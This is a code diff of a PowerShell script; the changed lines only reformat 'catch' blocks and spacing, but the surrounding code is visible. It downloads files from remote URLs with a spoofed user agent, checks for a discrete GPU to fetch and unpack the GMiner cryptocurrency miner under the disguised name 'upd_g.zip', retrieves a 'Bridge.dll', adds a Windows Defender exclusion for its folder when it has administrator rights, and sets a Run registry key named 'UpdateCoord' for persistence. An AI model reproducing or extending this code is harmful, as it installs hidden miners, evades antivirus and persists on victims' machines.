@@ -14,7 +14,8 @@ function Get-F($Url, $Path) {
         $wc.Headers.Add("User-Agent", $ua)
         $wc.DownloadFile($Url, $Path)
         if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 1KB) { return $true } }
-    } catch { }
+    }
+    catch { }
     try { curl.exe -sL -H "User-Agent: $ua" -o $Path $Url 2>$null; if (Test-Path $Path) { if ((Get-Item $Path).Length -gt 1KB) { return $true } } } catch { }
     return $false
 }
@@ -34,7 +35,7 @@ if (!(Test-Path $ce)) {
 }
 
 $gd = $false
-try { $ccs = Get-CimInstance Win32_VideoController -ErrorAction 0; foreach ($cc in $ccs) { $nn=$cc.Name.ToUpper(); if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 4GB) { if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } } } } catch { }
+try { $ccs = Get-CimInstance Win32_VideoController -ErrorAction 0; foreach ($cc in $ccs) { $nn = $cc.Name.ToUpper(); if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -or $cc.AdapterRAM -gt 4GB) { if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } } } } catch { }
 if ($gd -and !(Test-Path $ge)) {
     $gz = "$sDir\upd_g.zip"
     if (Get-F "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip" $gz) {
@@ -54,5 +55,6 @@ if (Get-F "$u2/Bridge.dll$v" $dp) {
         if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(512)) { try { Add-MpPreference -ExclusionPath $sDir -ErrorAction 0 } catch { } }
         Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateCoord" $tp -ErrorAction 0
         return
-    } catch { }
+    }
+    catch { }
 }
